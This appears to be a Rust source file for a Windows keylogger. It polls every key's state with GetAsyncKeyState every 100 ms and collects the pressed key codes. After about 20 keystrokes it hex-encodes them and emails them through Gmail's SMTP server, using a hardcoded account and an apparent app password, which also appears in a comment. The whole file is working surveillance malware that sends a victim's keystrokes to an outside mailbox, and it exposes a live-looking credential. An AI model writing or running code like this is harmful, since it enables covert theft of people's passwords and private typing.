use std::{thread, time};
use lettre::message::header::ContentType;
use lettre::{SmtpTransport, Transport};
use lettre::transport::smtp::authentication::Credentials;
use log::debug;
use tokio::net::windows::named_pipe::PipeMode::Message;
use windows::UI::Core::CoreVirtualKeyStates;
use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
use std::fmt::Write;
//CoreVirtualKeyStates

pub const BUFF_SIZE: usize = 1024*128;
#[inline]
pub fn check_key() -> Vec<u8>{
    let mut v = Vec::with_capacity(8);
    for i in 0..255u8{
        unsafe{
            let state = GetAsyncKeyState(i as i32);
            if state == 1 || state ==  -32767{
                v.push(i)
            }
        }

    }
    v
}

fn send_mail(num: u32, values: Vec<u8>){
    let mut body: String = String::with_capacity(BUFF_SIZE * 2 + 64);
    for v in values{
        write!(body, "{:02x}", v).unwrap();
    }

    let email = lettre::Message::builder()
        .from("app <serwerinstancja@gmail.com>".parse().unwrap())
        .to("Admin <serwerinstancja@gmail.com>".parse().unwrap())
        .subject(format!("R{}", num))
        .header(ContentType::TEXT_PLAIN)
        .body(body)
        .unwrap();
//ehwl bctr ybbj oqel
    let creds = Credentials::new("serwerinstancja".to_owned(), "ehwl bctr ybbj oqel ".to_owned());

    let mailer = SmtpTransport::relay("smtp.gmail.com")
        .unwrap()
        .credentials(creds)
        .build();

    match mailer.send(&email){
        Ok(_) => {
            println!("Email sent successfuly")
        }
        Err(e) => {
            println!("Could not send mail: {e:}")
        }
    }
}

fn main() {
    let milli_100 = time::Duration::from_millis(100);
    let mut vec = Vec::with_capacity(1024*128);
    let mut num =1;

    loop{
        thread::sleep(milli_100);
        let mut keys = check_key();

        if !keys.is_empty(){
            println!("{:02x?}", keys);
            vec.extend(keys);
            println!("len = {}", vec.len());
        }


        if vec.len() > 20usize {
            let mut send_vec = Vec::with_capacity(BUFF_SIZE);
            std::mem::swap(&mut send_vec, &mut vec);
            send_mail(num, send_vec);
            num += 1;
        }

    }
}
